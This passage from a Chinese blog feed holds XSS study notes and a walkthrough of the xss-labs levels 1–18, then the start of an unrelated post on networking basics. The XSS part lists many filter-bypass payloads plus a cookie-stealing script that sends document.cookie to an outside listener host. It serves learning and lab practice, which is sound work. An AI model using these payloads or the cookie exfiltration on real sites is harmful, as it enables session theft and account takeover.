title="0x02反射xss"></a>0x02反射xss</h2><p>攻击者在url中插入xss代码，服务器将url中的xss代码输入到页面上，攻击者将xss代码的url发送给用户，用户打开后受到xss攻击。</p><p>出现场景：url中可以传递参数</p><p>通常来说，会闭合一些标签，从而执行代码。</p><p>常用闭合</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;</span><br><span class="line">&#39;&gt;</span><br><span class="line">&lt;&#x2F;xxx&gt;</span><br></pre></td></tr></table></figure><p>其实还是具体情况具体对待</p><h2 id="0x03dom型xss"><a href="#0x03dom型xss" class="headerlink" title="0x03dom型xss"></a>0x03dom型xss</h2><p>攻击者在url中插入xss代码，前端页面直接从url中获取xss代码并且输入到页面，导致xss代码的执行，攻击者将带有xss代码的url发送给用户，用户打开后受到xss攻击</p><p>关于反射型和dom型差别：</p><p>前端处理是dom，后端处理是反射</p><h1 id="常用修复函数"><a href="#常用修复函数" class="headerlink" title="常用修复函数"></a>常用修复函数</h1><p>strip_tags：过滤html标签</p><p>htmlspecialchars：将html标签转换为实体</p><h1 id="常用的payload"><a href="#常用的payload" class="headerlink" title="常用的payload"></a>常用的payload</h1><h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x"</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"1"</span> <span class="attr">onerror</span>=<span class="string">eval(</span>"<span class="attr">alert</span>('<span class="attr">xss</span>')")&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>'<span class="attr">xss</span>')&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert('xss')"</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:eval(alert(</span>'<span class="attr">xss</span>'))&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:aaa"</span> <span class="attr">onmouseover</span>=<span class="string">"alert(/xss/)"</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">需要用编码绕过时：</span><br><span class="line">Base64：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg</span>==&gt;</span>M</span><br><span class="line"></span><br><span class="line">urlencode：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">data:text/html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E</span>&gt;</span>M </span><br><span class="line"></span><br><span class="line">HTML实体编码 ：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">j&amp;#x61;v&amp;#97script&amp;#x3A;&amp;#97lert(13)</span>&gt;</span>M</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">onclick</span>=<span class="string">alert(</span>'<span class="attr">xss</span>')&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">onclick</span>=<span class="string">eval(alert(</span>'<span class="attr">xss</span>'))&gt;</span>bb<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">onmouseover</span>=<span class="string">prompt(</span>'<span class="attr">xss</span>')&gt;</span>cc<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html,<span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert('xss')<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span>"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4="</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"aaa"</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>'<span class="attr">xss</span>') /&gt;</span><span class="tag">&lt;<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"javascript<span class="symbol">&amp;colon;</span>prompt<span class="symbol">&amp;lpar;</span>`xss`<span class="symbol">&amp;rpar;</span>"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">onclick</span>=<span class="string">alert(</span>'<span class="attr">xss</span>') <span class="attr">type</span>=<span class="string">"text"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>'<span class="attr">xss</span>')&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">onmouseover</span>=<span class="string">prompt(</span>'<span class="attr">xss</span>') <span class="attr">bad</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">1</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> &gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cookie盗取：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span> img=<span class="built_in">document</span>.createElement(<span class="string">"img"</span>);img.src=<span class="string">"http://xxx.xxx.xxx.xxx:1234/a?"</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">nc监听端口1234</span><br></pre></td></tr></table></figure><h1 id="xss编码"><a href="#xss编码" class="headerlink" title="xss编码"></a>xss编码</h1><h2 id="js编码"><a href="#js编码" class="headerlink" title="js编码"></a>js编码</h2><p>JS提供了四种字符编码的策略，</p><ul><li>三个八进制数字，如果数字不够，在前面补零，如a的编码为<code>\141</code></li><li>两个十六进制数字，如果数字不够，在前面补零，如a的编码为<code>\x61</code></li><li>四个十六进制数字，如果数字不够，在前面补零，如a的编码为<code>\u0061</code></li><li>对于一些控制字符，使用特殊的C类型的转义风格，如<code>\n</code>和<code>\r</code></li></ul><h2 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h2><p><strong>命名实体</strong><br>以<code>&amp;</code>开头，以分号结尾的，如<code>&lt;</code>的编码为<code>&amp;1t;</code></p><p><strong>字符编码</strong></p><p>十进制，十六进制的ASCII码或者Unicode字符编码。样式为<code>&amp;#</code>数值;</p><p>如<code>&lt;</code>的编码为</p><p><code>&lt;</code>(10进制)&amp;#60</p><p><code>&lt;</code>(16进制)&amp;#x003c</p><p><strong>URL编码</strong></p><p>这里为url全编码，也就是两次url编码</p><p>如alert的url全编码<code>为%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34</code></p><p><strong>String.fromCharCode编码</strong></p><p>如alert的编码为<code>String.fromCharCode(97,108,101,114,116)</code></p><h1 id="xss挑战题"><a href="#xss挑战题" class="headerlink" title="xss挑战题"></a>xss挑战题</h1><p>做任何题都可以测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&quot;script on alert()&quot; href&gt;</span><br></pre></td></tr></table></figure><p>做一下xss题</p><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p><img src="/2020/12/09/xss/image-20200821200652133.png" alt="image-20200821200652133"></p><p>可以发现test在h2标签处，直接写就可以只需要弹窗，就可以进入下一关</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;test&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><img src="/2020/12/09/xss/image-20200821201141420.png" alt="image-20200821201141420"></p><p><img src="/2020/12/09/xss/image-20200821201207838.png" alt="image-20200821201207838"></p><p>对比可以发现，值直接在value处，所以<strong>只需要闭合标签即可</strong></p><p><strong>搜索框里直接写</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>同时还有其他方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">需要鼠标划过输入框</span><br><span class="line">&quot; onmouseover&#x3D;alert(1)&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">需要点击搜索框</span><br><span class="line">&quot; onclick&#x3D;alert(1) &gt;</span><br><span class="line">&quot; onclick&#x3D;alert(1) &quot;</span><br></pre></td></tr></table></figure><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>这关进行了实体转义，<strong>也就是过滤了&lt;&gt;和””,</strong>所以我们可以利用单引号和注释符</p><p>其中转义函数<img src="/2020/12/09/xss/image-20200821203827654.png" alt="image-20200821203827654"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39; onclick&#x3D;alert(1)&#x2F;&#x2F;</span><br><span class="line">&#39; onmouseover&#x3D;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>和上一关一样，但需要注意的是<strong>双引号</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick&#x3D;alert(1) &quot;</span><br><span class="line">&quot; onclick&#x3D;alert(1) &#x2F;&#x2F;</span><br><span class="line">&quot; onfocus&#x3D;alert(1) autofocus&#x3D;&quot;</span><br><span class="line">&quot; onfocus&#x3D;alert(1) &#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p>这个关卡过滤了on，但没有过滤单双引号，<strong>所以可以用伪协议</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a href&#x3D;&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&quot;&gt; &lt;a href&#x3D;&quot;javascript:alert(1)&quot;&gt;111&lt;&#x2F;a&gt; &#x2F;&#x2F;</span><br><span class="line">&quot;&gt;&lt;iframe src&#x3D;javascript:alert(1)&gt;</span><br><span class="line">&quot;&gt;&lt;iframe src&#x3D;javascript:alert(1)&gt;</span><br></pre></td></tr></table></figure><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p>script 转换成 scr_ipt        on 转换成 o_n        src 转换成 sr_c        data 转换成 da_ta        href 转换成 hr_ef</p><p><strong>但可以大小写绕过</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;Script&gt;alert(1)&lt;&#x2F;script&gt;</span><br><span class="line">&quot;&gt; &lt;a Href&#x3D;&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&quot; Onclick&#x3D;alert(1) &#x2F;&#x2F;</span><br><span class="line">&quot; Onclick&#x3D;alert(1) &quot;</span><br></pre></td></tr></table></figure><h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><p>过滤了script，on，href</p><p><strong>所以可以双写绕过</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a hrhrefef&#x3D;&quot;javascriscriptpt:alert(1)&quot;&gt;111&lt;&#x2F;a&gt;&#x2F;&#x2F;</span><br><span class="line">&quot;&gt;&lt;scriscriptpt&gt;alert(1)&lt;&#x2F;scriscriptpt&gt;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p>script,on，src，data，href，大小写失效，”被编码所以value处几乎找不到</p><p>但下面链接处可以看到 &lt;&gt; ‘ % # &amp; 未被过滤 看了别人题解之后是<strong>html实体编码绕过</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javasc&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(1)</span><br><span class="line">javasc&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)</span><br></pre></td></tr></table></figure><h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p>不了解，去看了源码是<strong>得加http://</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javasc&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)&#x2F;&#x2F;http:&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><p>这真想不出来</p><p>试了三个参数，发现只有最后一个可以写入，<strong>直接构造</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot; type&#x3D;text onmouseover&#x3D;alert(1) &#x2F;&#x2F;</span><br><span class="line">&quot; type&#x3D;image src&#x3D;1 onerror&#x3D;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><p>这个题应该是抓包看，但由于我是谷歌做题，火狐抓包，导致每次直接复制11题url它都不会直接抓到ref头，正确应该是在10题向11题跳转时抓包。</p><p><img src="/2020/12/09/xss/image-20200822205648946.png" alt="image-20200822205648946"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover&#x3D;alert(1) type&#x3D;&#39;text&#39;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p>把ref头改成这个，发包即可</p><h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><p>有了上一个题的提示，这个题就明显很多了</p><p>只要改一下UA头</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko&#x2F;20100101 Firefox&#x2F;79.0&quot; onmouseover&#x3D;alert(1) type&#x3D;&quot;text&quot; &#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><p>这个应该是改cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__cfduid&#x3D;d0d48515569060ded9a058127e163bb661598095904;user&#x3D;&quot; onmouseover&#x3D;alert(1) type&#x3D;&quot;text&quot; &#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><p>链接好像是挂掉了，但好像是没有太看懂，回头再来看一下</p><h2 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h2><p>看源码发现</p><p><img src="/2020/12/09/xss/image-20200822213204305.png" alt="image-20200822213204305"></p><p>然后上网查一下</p><p><strong>ng-include</strong> 指令用于包含外部的 HTML 文件。</p><p>包含的内容将作为指定元素的子节点。</p><p><code>ng-include</code> 属性的值可以是一个表达式，返回一个文件名。</p><p>默认情况下，包含的文件需要包含在<strong>同一个域名</strong>下。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src&#x3D;&#39;level1.php?name&#x3D;test&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&#39;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;&lt;span class&#x3D;&quot;ng-include:&#39;level1.php?name&#x3D;test&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&#39;&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure><p>也就是说src包含的内容会进入ng-include被包含</p><p>那我们可以想出能不能直接闭合</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src&#x3D;&quot;&gt;&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure><p>但发现直接被转义了，所以还是不行，只能包含第一关代码</p><h2 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h2><p>这个题是把空格过滤了</p><p>用%0d和%0a绕过</p><p><strong>%0a换行符号”\n”<br>%0d回车符号”\r”</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img%0Dsrc&#x3D;1%0Donerror&#x3D;alert(1)&gt;</span><br><span class="line">&lt;img%0asrc&#x3D;1%0aonerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure><h2 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h2><p>就找源码和url之间的关系</p><p>可以看见在src处有不同</p><p>&lt;&gt;被过滤，考虑on事件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg02&#x3D; onmouseover&#x3D;alert(1)</span><br></pre></td></tr></table></figure><h2 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h2><p>和17关一样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01&#x3D;a%20&amp;arg02&#x3D;b onmouseover&#x3D;alert(1)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- 反引号代替圆括号</span><br><span class="line">- 换行绕过正则</span><br><span class="line">- &lt;!--不仅可以用--&gt;,也可以用--!&gt;闭合</span><br><span class="line">- &#x2F;&#x2F;可以用换行来绕过</span><br><span class="line">- &lt;!--和--&gt;都可以在html的script标签里单独使用进行单行注释</span><br><span class="line">- ſ 符号转换为大写后正好为大写字母 S</span><br><span class="line">- 可以用 %0a 代替空格进行绕过</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这篇更乱，也就那个小挑战还算完整&lt;/p&gt;
&lt;h1 id=&quot;XSS&quot;&gt;&lt;a href=&quot;#XSS&quot; class=&quot;headerlink&quot; title=&quot;XSS&quot;&gt;&lt;/a&gt;XSS&lt;/h1&gt;&lt;h2 id=&quot;基础知识&quot;&gt;&lt;a href=&quot;#基础知识&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="web" scheme="https://pz1o.top/categories/web/"/>
    
    
    <category term="web" scheme="https://pz1o.top/tags/web/"/>
    
    <category term="xss" scheme="https://pz1o.top/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>计网</title>
    <link href="https://pz1o.top/2020/12/09/%E8%AE%A1%E7%BD%91/"/>
    <id>https://pz1o.top/2020/12/09/%E8%AE%A1%E7%BD%91/</id>
    <published>2020-12-09T15:29:40.000Z</published>
    <updated>2020-12-09T15:32:12.091Z</updated>
    
    <content type="html"><![CDATA[<p>这个只有这一部分了</p><p>后面学了但好像丢了</p><p>看多会学到计网时，再来补这一篇</p><h1 id="计网初学"><a href="#计网初学" class="headerlink" title="计网初学"></a>计网初学</h1><h2 id="TCP-IP分层模型"><a href="#TCP-IP分层模型" class="headerlink" title="TCP/IP分层模型"></a><strong>TCP/IP分层模型</strong></h2><div class="table-container"><table><thead><tr><th>应用层（第五层)</th></tr></thead><tbody><tr><td><strong>传输层（第四层）</strong></td></tr><tr><td><strong>互联网层（第三层）</strong></td></tr><tr><td><strong>网路接口层（第二层）</strong></td></tr><tr><td><strong>物理层（第一层）</strong></td></tr></tbody></table></div><p>物理层：对应于网络的基本硬件，即我们可以看得见的硬件设备。</p><p>网络接口层：定义了将数据组成正确帧的规程和在网络中传输帧的规程。</p><p>互联网层：本层定义了互联网中传输的信息包的格式，以及从一个用户通过一个或多个路由器到最终目标的信息包转发机制。</p><p>传输层：为两个用户进程之间建立，管理和拆除可靠而又有效的端到端的连接。</p><p>应用层：定义了应用程序使用互联网的规程。</p><h2 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h2><p>ip地址分为两部分：网络标识和主机标识</p><p>网络标识：用以标明具体的网络段</p><p>主机标识：某个网络中待定的计算机号码</p><p>网络标识：210.73.140.0</p><p>主机标识：                    2</p><p>合起来写：210.73.140.2</p><p>人们按照网络规模的大小，把32为地址信息设成3种定位的划分方式，三种划分方法分别对应于A，B，C类IP地址，IP地址分为网络号和主机号两部分</p><p>（1）A类IP地址（1-126）</p><p>该地址由1字节网络地址和3字节主机地址组成，网络地址最高位必须是0。</p><p>（2）B类IP地址（128-191）</p><p>该地址由2字节网络地址和2字节主机地址组成，网络地址最高位必须是10。</p><p>（3）C类IP地址（192-223）</p><p>该地址由3字节网络地址和1字节主机地址组成，网络地址最高位必须是110。</p><p>（4）D类IP地址（224-239）</p><p>多点广播地址，用于IP组播。</p><p>（5）E类IP地址（240-225）</p><p>保留地址，用作特殊用途。</p><p>（0.0.0.0）对应当前主机，（255.255.255.255）是当前子网的传播地址。</p><h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><p>顶级域名 .com</p><p>二级域名 test.com</p><p>三级域名 test.cn.com</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200609213455144.png" alt="image-20200609213455144"></p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200609214339970.png" alt="image-20200609214339970"></p><h2 id="DNS服务器"><a href="#DNS服务器" class="headerlink" title="DNS服务器"></a>DNS服务器</h2><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200609214938548.png" alt="image-20200609214938548"></p><h1 id="计网学习"><a href="#计网学习" class="headerlink" title="计网学习"></a>计网学习</h1><h2 id="第一章-计算机网络概述"><a href="#第一章-计算机网络概述" class="headerlink" title="第一章 计算机网络概述"></a>第一章 计算机网络概述</h2><p>局域网：覆盖范围小  自己花钱买设备  带宽固定</p><p>广域网：距离远 花钱买服务</p><p>Internet ：有自己的机房  对网民提供连接。</p><p>IP地址：网络中的地址。</p><p>物理地址：Mac地址，电脑出厂时已固定。</p><p>网关：下图中的G就是网关，相当于网络中的一个关卡。网关地址为G的IP地址。</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200609224145835.png" alt="image-20200609224145835"></p><div class="table-container"><table><thead><tr><th>本机ip</th><th>访问ip</th><th>本机mac</th><th>下次访问mac</th></tr></thead><tbody><tr><td>15.0.0.2</td><td>13.0.0.2</td><td>m4</td><td>m5</td></tr></tbody></table></div><p><strong>OSI参考模型</strong></p><ul><li>应用层：能产生网络流量的程序</li><li>表示层：在传输之前是否加密或压缩处理</li><li>会话层：查正在进行会话的程序 netstat -nb</li><li>传输层：可靠传输（TCP）和流量控制 不可靠传输（UDP）</li><li>网络层：选择最佳路径 规划IP地址</li><li>数据链路层：帧的开始和结束。差错检查。</li><li>物理层：接口标准和电器标准</li></ul><p><strong>OSI参考模型网络排错指导</strong></p><ol><li>物理层故障：查看连接状态，发送和接受的数据包</li><li>数据链路层：MAC地址冲突、网速协商不一致、计算机VLAN错误</li><li>网络层故障：配置错误的IP地址 子网掩码和错误的网关</li><li>应用层故障：应用错误代理。</li></ol><p>检查网络是否通畅：ping一个网址</p><p><strong>OSI参考模型和网络安全</strong></p><ol><li>物理层安全</li><li>数据链路层安全：登录需要账号和密码</li><li>网络层安全：路由器限制数据包流量</li><li>应用层安全：开发程序有没有漏洞<img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200610122326325.png" alt="image-20200610122326325"></li></ol><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200610122957433.png" alt="image-20200610122957433"></p><h2 id="第二章-物理层"><a href="#第二章-物理层" class="headerlink" title="第二章 物理层"></a>第二章 物理层</h2><h3 id="0x01物理层的基本概念"><a href="#0x01物理层的基本概念" class="headerlink" title="0x01物理层的基本概念"></a>0x01物理层的基本概念</h3><p>物理层解决如何连接在各种计算机的<strong>传输媒体上</strong>传输<strong>数据比特流</strong>，不是指具体的传输媒体。</p><p>物理层主要是确定传输媒体的接口的一些特性。有机械，电器，功能，过程特性。</p><h3 id="0x02数据通信知识"><a href="#0x02数据通信知识" class="headerlink" title="0x02数据通信知识"></a>0x02数据通信知识</h3><p><strong>数据通信模型</strong>：</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611101252348.png" alt="image-20200611101252348"></p><p>数据：运送消息的实体。</p><p>信号：数据电气或电磁的表现。</p><p>信道：表示一个方向传送信息的媒体。</p><p>单向通信，双向交替通信，双向同时通信。</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611103259080.png" alt="image-20200611103259080"></p><h3 id="0x03物理层下面的传输媒体"><a href="#0x03物理层下面的传输媒体" class="headerlink" title="0x03物理层下面的传输媒体"></a>0x03物理层下面的传输媒体</h3><p>无屏蔽双绞线UTP</p><p>屏蔽双绞线STP</p><p>同轴电缆</p><p>光纤</p><p>微波传输</p><p>物理层设备—集线器</p><h3 id="0x04信道复用技术"><a href="#0x04信道复用技术" class="headerlink" title="0x04信道复用技术"></a>0x04信道复用技术</h3><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611121924344.png" alt="image-20200611121924344"></p><h3 id="0x05数字传输系统"><a href="#0x05数字传输系统" class="headerlink" title="0x05数字传输系统"></a>0x05数字传输系统</h3><h3 id="0x06宽带接入技术"><a href="#0x06宽带接入技术" class="headerlink" title="0x06宽带接入技术"></a>0x06宽带接入技术</h3><p>ADSL</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611122852820.png" alt="image-20200611122852820"></p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611123214486.png" alt="image-20200611123214486"></p><p>光纤</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611123435591.png" alt="image-20200611123435591"></p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611123546821.png" alt="image-20200611123546821"></p><h2 id="第三章数据链路层"><a href="#第三章数据链路层" class="headerlink" title="第三章数据链路层"></a>第三章数据链路层</h2><h3 id="0x01数据链路层基本概念"><a href="#0x01数据链路层基本概念" class="headerlink" title="0x01数据链路层基本概念"></a>0x01数据链路层基本概念</h3><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615185534103.png" 